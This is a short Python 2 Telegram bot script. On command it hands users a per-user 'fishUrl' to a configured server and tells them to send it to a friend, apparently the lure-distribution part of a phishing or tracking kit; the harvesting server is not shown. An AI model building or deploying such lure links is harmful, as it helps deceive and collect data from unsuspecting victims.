# import sys
import time, datetime
import telepot
from telepot.loop import MessageLoop
from config import *

def on_chat_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    print ""
    print datetime.datetime.now()

    answer = 'Server error'

    text = ""
    userName=""

    if 'text' in msg:
        text = msg['text']

    if 'chat' in msg:
        if 'username' in msg['chat']:
            userName =  (msg['chat']['username'])

    if content_type == 'text':
        if text == '/getmeurl':
            print "User {0} connect!".format(userName)
            answer = 'HI! YOU A GOD!\n'

            fishUrl = "http://{0}:{1}/memStorage?memId={2}".format(serverIP, serverPORT, chat_id)
            answer += "Send this url to your friend:\n{0}".format(fishUrl)



        elif text == '/info':
            print "User {0} get INFO! Chat Id = {1}".format(userName, chat_id)
            answer = "DISCLAIMER\n" \
                     "Hi! This is bot just for a funny. Don't use this bot to obtain the forbidden information.\n" \
                     "Do not use for bad purposes.\n"
        else:
            print "Try connect from is {0} user. Chat Id = {1}".format(userName, chat_id)


    bot.sendMessage(chat_id, answer)




bot = telepot.Bot(TOKEN)
MessageLoop(bot, {'chat': on_chat_message}).run_as_thread()
print('Listening ...')

while 1:
    time.sleep(10)



